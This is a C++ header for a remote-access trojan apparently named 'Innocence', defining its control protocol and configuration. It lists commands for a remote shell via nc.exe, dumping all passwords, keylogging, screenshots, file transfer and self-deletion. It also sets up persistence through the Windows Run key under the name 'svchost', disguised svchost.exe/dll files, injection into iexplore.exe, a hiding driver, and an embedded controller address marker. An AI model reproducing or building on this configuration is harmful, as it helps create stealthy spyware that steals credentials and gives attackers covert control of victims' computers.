#pragma once

//#include <Build.hpp>
#include <network/Types.hpp>
#include <network/Timeout.hpp>

namespace Innocence
{
    enum
	{
		CONNECTION_INFO_SIZE = 256,
		LOG_COLLECTOR_PORT = 80,
		AUDIT_SERVER_PORT = 81
	};
    
    struct ConnectionInfo
    {
        std::string name;
        std::string ip;
        Network::Port port;
        std::string password;
		Network::Timeout deadline;
    };
    
	const static char blaspheme [CONNECTION_INFO_SIZE] = "*#+127.0.0.1:80:default:crunch*#+";
	
	#define MARKER_SIZE 3
	#define MARKER "*#+"
	#define SEPERATOR ':'
	
	// AUDITOR AGENT & SERVER CONFIG
	static const char * LOG_COLLECTOR_IP = "127.0.0.1";
	static const char * AUDIT_SERVER_IP = "127.0.0.1";

	static const char * PIPE_AUDIT_HEADER = "AUDIT PIPE";
	static const char * PIPE_AUDIT_PIPE_NAME = "\\\\.\\pipe\\audit_pipe";

	static const char * ISADMIN_AUDIT_HEADER = "AUDIT ISADMIN";

	static const char * INJECTION_AUDIT_HEADER = "AUDIT INJECTION";

	static const char * ISINJECTED_AUDIT_HEADER = "AUDIT ISINJECTED";
	static const char * ISINJECTED_AUDIT_PIPENAME = "\\\\.\\pipe\\audit_injection";
	static const char * ISINJECTED_PROOF = "INJECTED";

	static const char * STEALTH_AUDIT_HEADER = "AUDIT STEALTH";
	static const char * REGISTRE_AUDIT_HEADER = "AUDIT REGISTRE";

	static const char * ELEVATOR_AUDIT_HEADER = "AUDIT ELEVATOR";
	
	// MASTER & SLAVE PROTOCOL CONFIG
	#define HIBERNATE           "hibernate"
	#define SHUTDOWN            "shutdown"
	#define REBOOT              "reboot"
	#define LOGOUT              "logout"
	#define KILL_PROCESS        "kill_process"
	#define KILL_CLIENT         "kill_client"
	#define UNINSTALL_CLIENT    "uninstall_client"
	#define REBOOT_CLIENT       "reboot_server"
	#define UPGRADE_CLIENT      "update_client"
	#define PASSWORDS_GETALL    "passwords_getall"
	#define GET_PROCESSLIST     "get_processlist"
	#define GET_WINDOWS_VERSION "get_windows_version"
	#define GET_CLIENT_NAME     "get_client_name"
	#define REMOTE_SHELL        "remote_shell"
	#define BROWSE_FILES        "browse_files"
	#define GET_SCREEN          "get_screen"
	#define GET_LOGFILE         "get_logfile"
	#define START_DOWNLOAD      "start_download"
	#define START_UPLOAD        "start_upload"

	#define SUCCESS             "success"
	#define FAILURE             "failure"
	#define UNKNOW_CMD          "unknow_cmd"
	#define KEYLOG_EMPTY        "keylog_empty"
	#define FINISHED            "finished"

	static const char * KEYLOG = "system_output.txt";
	static const char * SCREEN_PATH = "sleeper_downloaded_screenshot.jpg";
	static const char * LOG_PATH_DOWNLOAD = "sleeper_downloaded_log.txt";
	static const char * SHELL_PROGRAM = "nc.exe";
	static const char * RUN_KEY_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
	static const char * RUN_KEY_NAME = "svchost";
	static const char * INHIBITION_DLL_NAME = "svchost.dll";
	static const char * INHIBITER_EXE_NAME = "svchost.exe";
	static const char * DEFAULT_INJECTED_PROCESS_NAME = "iexplore.exe";
	static const char * DRIVER_NAME = "bnhhide.sys";
	static const char * UNINSTALL_CMD = "uninstall_innocence";
	static const char * SELF_DELETE_CMD = "self_delete";
	static const char * PIPE_NAME = "\\\\.\\pipe\\innocence";
	static const bool   INJECT_DEFAULT_BROWSER = false;
	
} // Innocence
